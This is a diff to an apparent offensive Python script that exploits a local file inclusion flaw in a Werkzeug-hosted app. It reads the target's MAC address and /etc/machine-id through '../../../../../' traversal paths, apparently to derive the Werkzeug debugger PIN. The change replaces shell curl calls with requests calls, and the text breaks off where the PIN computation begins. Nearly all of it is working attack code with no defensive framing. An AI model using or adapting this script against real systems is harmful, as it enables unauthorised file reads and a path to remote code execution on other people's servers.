@@ -1,30 +1,41 @@
 #!/usr/bin/env python3
 
-import subprocess
+import requests
+from base64 import b64encode
 import hashlib
 from itertools import chain
 
 user = ''   # Username to authenticate to Werkzeug
 passwd = '' # Password to authenticate to Werkzeug
+creds = b64encode("{0}:{1}".format(user, passwd).encode('UTF-8')).decode('ascii')
 iface = ''  # Interface name from the remote system (ens33, eth{0,1,...}, etc)
 rhost = ''  # IP address or hostname of the remote system hosting Werkzeug
 rport = ''  # Remote Port number of the service to access should be an integer, not a string.
-lfi_page_dir = ''
+
+lfi_page_dir = ''   # Directory or page that allows LFI
+mac_path = '../../../../../sys/class/net/{0}/address'.format(iface) # Path to Mac Address
+id_path = '../../../../../etc/machine-id'   # Path to Machine-ID
+url = 'http://{0}:{1}/{2}?filename='.format(rhost, rport, lfi_page_dir)
 
 werk_user = ''  # User Werkzeug runs as. Could be the same as the user for the HTTP Request.
 
-maccmd = "/usr/bin/curl -sX GET \
-    --url 'http://{2}:{3}/{4}?filename=../../../../../sys/class/net/{5}/address' \
-        -u '{0}:{1}' | tr -d ':' | tr -d '\n'"
-idcmd = "/usr/bin/curl -sX GET \
-    --url 'http://{2}:{3}}/{4}?filename=../../../../../etc/machine-id' \
-        -u '{0}:{1}' | tr -d '\n'"
+payload = {}
+headers = {
+    'Authorization': 'Basic {0}'.format(creds)
+}
 
-maccmd.format(user, passwd, rhost, rport, lfi_page_dir, iface)
-idcmd.format(user, passwd, rhost, rport, lfi_page_dir)
+get_node = str(int(requests.request(
+    "GET",
+    url + mac_path,
+    headers=headers,
+    data=payload).text.strip().replace(':', ''), base=16))
 
-get_node = str(int(subprocess.check_output(maccmd.strip(), shell=True, text=True), base=16))
-get_machine_id = subprocess.check_output(idcmd.strip(), shell=True, text=True)
+get_machine_id = requests.request(
+    "GET",
+    url + id_path,
+    headers=headers,
+    data=payload
+    ).text.strip()
 
 # probably_public_bits = [username, modname,
 #                         getattr(app, '__name__', getattr(app.__class__, '__name__')),
